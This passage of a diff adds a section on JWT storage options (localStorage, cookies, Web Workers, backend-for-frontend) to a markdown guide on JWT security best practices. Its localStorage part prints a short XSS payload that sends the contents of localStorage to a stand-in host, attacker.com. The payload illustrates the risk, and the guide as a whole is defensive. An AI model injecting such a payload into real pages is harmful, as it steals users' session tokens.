@@ -18,6 +18,13 @@
 11. [Use Explicit Typing](#11-use-explicit-typing) - Limit your scope of `typ`, and enforce it where possible.
 12. [Use Mutually Exclusive Validation Rules for Different Kinds of JWTs](#12-use-mutually-exclusive-validation-rules-for-different-kinds-of-jwts)
 
+13. [JWT Storage](#13-jwt-storage)
+    1.  [localStorage](#localstorage) - Only for non-sensitive SPAs or if you KNOW you're not susceptible to XSS.
+    2.  [sessionStorage](#sessionstorage) - See [localStorage]().
+    3.  [Browser In-Memory](#browser-in-memory) - Sure, if you don't need to maintain auth on refresh.
+    4.  [Cookies](#cookies) - Secure, if implemented correctly. Requires CSRF checks.
+    5.  [Web Worker](#web-worker) - Secure, but non-persistent storage may limit this option.
+    6.  [BFF - Backend for Frontend](#bff---backend-for-frontend) - Effectively a backend proxy that handles all the token storage and exchange on behalf of the frontend; keeping any sensitive tokens out of the backend. Communication between the frontend/backend is handled with encrypted tokens and secure cookies;
 
 
 Initial dump of [RFC8725](https://datatracker.ietf.org/doc/rfc8725/), with additional commentary added where it would make more sense or make the point clearer.
@@ -105,3 +112,52 @@ Initial dump of [RFC8725](https://datatracker.ietf.org/doc/rfc8725/), with addit
    *  Use different issuers for different kinds of JWTs.  Then the distinct "iss" values can be used to segregate the different kinds of JWTs.
 
    Given the broad diversity of JWT usage and applications, the best combination of types, required claims, values, Header Parameters, key usages, and issuers to differentiate among different kinds of JWTs will, in general, be application-specific.  As discussed in Section 11, for new JWT applications, the use of explicit typing is RECOMMENDED.
+
+## 13. JWT Storage
+A main point to remember here is: 
+> You cannot keep secrets in JavaScript in the browser. 
+> 
+> If your application can access a sensitive token, so can malicious JS code runnig in the same context.
+
+
+### localStorage
+
+Non-sensitive SPAs can handle tokens in the browser. One must follow all other security best practices though, as anything in the browser that the application can access, so can the attacker.
+
+XSS Payload Example:
+```javascript
+let img = new Image();
+img.src = `https://attacker.com?data=${JSON.stringify(localStorage)}`
+```
+
+If you do choose this, it's recommended to reduce the expiration time of the tokens. Reduce the reliance on 3rd Party JS where possible, and implement [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity) checking.
+
+### sessionStorage
+Everything said about [localStorage](#localstorage) applies here, just with smaller windows, assuming a user closes their browser/tab. But who does that?!
+
+### Browser In-Memory
+
+### Cookies
+If implemented correctly this can actually be secure. But it's usecase may not be usable everywhere, especially if interacting with 3rd party domains.
+* `SameSite=strict`
+* `secure`
+* `httpOnly`
+  
+This will require the implementation of CSRF Protections though if you DO need to work with 3rd party resources. If you only communicate with first-party resources, `SameSite` should be enough.
+
+### Token Binding / Demonstration of Proof of Possession (DPoP)
+
+### Web Worker
+Using [Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API) to handle the transmission and storage of tokens is a good way to protect the tokens, as Web Workers run in a separate global scope than the rest of the application. 
+
+If you cannot use Web Workers, an alternative could be the use of [JavaScript closures](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Closures#Emulating_private_methods_with_closures) to emulate private methods.
+
+Auth0 SKD utilizes Web Workers by default and if your applicaiton can utilize this SDK (standard auth flow), then it's a good choice.
+
+This does come at the loss of persistence across page refreshes and browser tabs though.
+
+
+### BFF - Backend For Frontend
+[Duende Software](https://docs.duendesoftware.com/identityserver/v6/overview/big_picture/) has build out a great .NET framework for this, and their[ documentation ](https://docs.duendesoftware.com/identityserver/v6/overview/big_picture/)does a good job of explaining it. I first learned about it in [Dr. Philippe De Ryck's The impact of XSS on OAuth 2 in SPAs talk](https://www.youtube.com/watch?v=lEnbi4KClVw&t=2280s).
+
+tl;dr - it's basically putting a backend in place to proxy all the requests and management of tokens on behalf of your frontend.
